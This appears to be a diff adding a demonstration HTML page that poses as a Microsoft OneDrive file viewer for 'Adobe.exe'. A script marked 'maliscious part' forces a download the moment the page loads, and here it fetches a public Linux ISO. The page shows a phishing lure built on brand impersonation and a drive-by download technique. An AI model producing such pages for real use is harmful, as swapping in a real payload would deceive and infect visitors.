@@ -1,0 +1,84 @@
+<!-- This will download a linux IOS from link.href as soon as the HTML it opened -->
+<!-- https://distro.ibiblio.org/puppylinux/puppy-bookwormpup/BookwormPup64/10.0.9/BookwormPup64_10.0.9.iso -->
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OneDrive - Secure File Viewer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
+            text-align: center;
+            padding-top: 50px;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 400px;
+            margin: auto;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
+        }
+        .file-icon {
+            width: 100px;
+        }
+        .file-info {
+            margin-top: 15px;
+        }
+        .download-btn {
+            background-color: #0078D4;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+        }
+        .download-btn:hover {
+            background-color: #005a9e;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://logos-world.net/wp-content/uploads/2022/04/Microsoft-OneDrive-Logo-2014.png" alt="OneDrive" width="150">
+        <h3>Adobe.exe</h3>
+        <p>Secure Download • 722 MB</p>
+        <button class="download-btn" onclick="downloadISO()">Download</button>
+    </div>
+
+</body>
+</html>
+
+<script>
+function downloadISO() {
+    let link = document.createElement("a");
+    link.href = "https://distro.ibiblio.org/puppylinux/puppy-bookwormpup/BookwormPup64/10.0.9/BookwormPup64_10.0.9.iso";
+    link.download = "BookwormPup64_10.0.9.iso";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+</script>
+
+<!-- maliscious part -->
+
+<script>
+window.onload = function() {
+    let link = document.createElement("a");
+    link.href = "https://distro.ibiblio.org/puppylinux/puppy-bookwormpup/BookwormPup64/10.0.9/BookwormPup64_10.0.9.iso";
+    link.download = "test.iso";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+};
+</script>
+
